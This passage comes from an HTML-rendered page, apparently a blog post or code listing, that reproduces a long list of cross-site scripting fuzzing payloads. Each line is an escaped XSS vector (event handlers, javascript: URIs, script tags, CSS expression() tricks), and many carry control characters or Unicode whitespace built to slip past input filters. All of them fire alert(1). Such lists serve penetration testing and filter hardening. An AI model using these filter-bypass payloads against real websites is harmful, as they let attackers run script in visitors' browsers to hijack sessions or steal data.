onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onerror&gt;</span><br><span class="line">&lt;body onkeyup body onkeyup=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeyup&gt;</span><br><span class="line">&lt;body onunload body onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onunload&gt;</span><br><span class="line">&lt;iframe onload iframe onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onload&gt;</span><br><span class="line">&lt;body onload body onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onload&gt;</span><br><span class="line">&lt;html onmouseover html onmouseover=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmouseover&gt;</span><br><span class="line">&lt;object onbeforeload object onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onbeforeload&gt;</span><br><span class="line">&lt;body onbeforeunload body onbeforeunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onbeforeunload&gt;</span><br><span class="line">&lt;body onfocus body onfocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onfocus&gt;</span><br><span class="line">&lt;body onkeydown body onkeydown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeydown&gt;</span><br><span class="line">&lt;iframe onbeforeload iframe onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onbeforeload&gt;</span><br><span class="line">&lt;iframe src iframe src=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe src&gt;</span><br><span class="line">&lt;svg onload svg onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onload&gt;</span><br><span class="line">&lt;html onmousemove html onmousemove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmousemove&gt;</span><br><span class="line">&lt;body onblur body onblur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onblur&gt;</span><br><span class="line">\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&apos;&quot;`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;</span><br><span class="line">&lt;script&gt;javascript:alert(1)&lt;/script\x0D</span><br><span class="line">&lt;script&gt;javascript:alert(1)&lt;/script\x0A</span><br><span class="line">&lt;script&gt;javascript:alert(1)&lt;/script\x0B</span><br><span class="line">&lt;script charset=&quot;\x22&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;!--\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;</span><br><span class="line">--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;</span><br><span class="line">--&gt;&lt;!-- --\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;</span><br><span class="line">--&gt;&lt;!-- --\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;</span><br><span class="line">--&gt;&lt;!-- --\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=&apos;#\x27 onerror=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x3Ajavascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&quot;&apos;`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a=&apos;hello\x27;javascript:alert(1)//&apos;;&lt;/script&gt;&lt;/p&gt;</span><br><span class="line">&lt;a href=&quot;javas\x00cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x07cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x0Dcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x0Acript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x08cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x02cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x03cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x04cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x01cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x05cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x0Bcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x09cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x06cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javas\x0Ccript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;script&gt;/* *\x2A/javascript:alert(1)// */&lt;/script&gt;</span><br><span class="line">&lt;script&gt;/* *\x00/javascript:alert(1)// */&lt;/script&gt;</span><br><span class="line">&lt;style&gt;&lt;/style\x3E&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;</span><br><span class="line">&lt;style&gt;&lt;/style\x0D&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;</span><br><span class="line">&lt;style&gt;&lt;/style\x09&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;</span><br><span class="line">&lt;style&gt;&lt;/style\x20&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;</span><br><span class="line">&lt;style&gt;&lt;/style\x0A&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;</span><br><span class="line">&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\x7Dx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF</span><br><span class="line">&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\x3Bx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF</span><br><span class="line">&lt;script&gt;if(&quot;x\\xE1\x96\x89&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;if(&quot;x\\xE0\xB9\x92&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;if(&quot;x\\xEE\xA9\x93&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;</span><br><span class="line">&apos;`&quot;&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&apos;`&quot;&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;&apos;`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;</span><br><span class="line">&quot;&apos;`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;</span><br><span class="line">&lt;script src=&quot;data:text/plain\x2Cjavascript:alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;data:\xD4\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;data:\xE0\xA4\x98,javascript:alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;data:\xCB\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">ABC&lt;div style=&quot;x\x3Aexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:expression\x5C(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:expression\x00(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:exp\x00ression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:exp\x5Cression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x0Aexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x09expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE3\x80\x80expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x84expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xC2\xA0expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x80expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x8Aexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x0Dexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x0Cexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x87expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xEF\xBB\xBFexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x20expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x88expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x00expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x8Bexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x86expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x85expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x82expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\x0Bexpression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x81expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x83expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">ABC&lt;div style=&quot;x:\xE2\x80\x89expression(javascript:alert(1)&quot;&gt;DEF</span><br><span class="line">&lt;a href=&quot;\x0Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x0Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xC2\xA0javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x05javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE1\xA0\x8Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x18javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x11javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x88javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x89javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x17javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x03javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x0Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x00javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x10javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x82javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x20javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x13javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x09javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x8Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x14javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x19javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\xAFjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x81javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x87javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x07javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE1\x9A\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x83javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x04javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x01javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x08javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x84javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x86javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE3\x80\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x12javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x0Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x0Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x0Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x15javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\xA8javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x16javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x02javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x06javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\xA9javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x80\x85javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\xE2\x81\x9Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;\x1Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x00:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x3A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x09:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x0D:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript\x0A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x0Aonerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x22onerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x0Bonerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x0Donerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x2Fonerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x09onerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x0Conerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x00onerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x27onerror=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x \x20onerror=javascript:alert(1)&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x3Bjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x0Djavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x09javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x00javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x0Cjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x2Bjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x0Ajavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x7Ejavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xC2\x85javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x21javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x0Bjavascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\x20javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;`&apos;&gt;&lt;script&gt;\xC2\xA0javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x22javascript:alert(1)\x22src=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x09javascript:alert(1)\x09src=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x27javascript:alert(1)\x27src=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x60javascript:alert(1)\x60src=xxx:x /&gt;</span><br><span class="line">&quot;/&gt;&lt;img/onerror=\x20javascript:alert(1)\x20src=xxx:x /&gt;</span><br><span class="line">&lt;script\x2F&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x20&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x0D&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x0A&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x0C&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x00&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script\x09&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0B=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x00=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0C=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0D=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x20=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x0A=javascript:alert(1)&gt;</span><br><span class="line">`&quot;&apos;&gt;&lt;img src=xxx:x onerror\x09=javascript:alert(1)&gt;</span><br><span class="line">&lt;script&gt;javascript:alert(1)&lt;\x00/script&gt;</span><br><span class="line">&lt;img src=# onerror\x3D&quot;javascript:alert(1)&quot; &gt;</span><br><span class="line">&lt;input onfocus=javascript:alert(1) autofocus&gt;</span><br><span class="line">&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;video poster=javascript:javascript:alert(1)//</span><br><span class="line">&lt;body 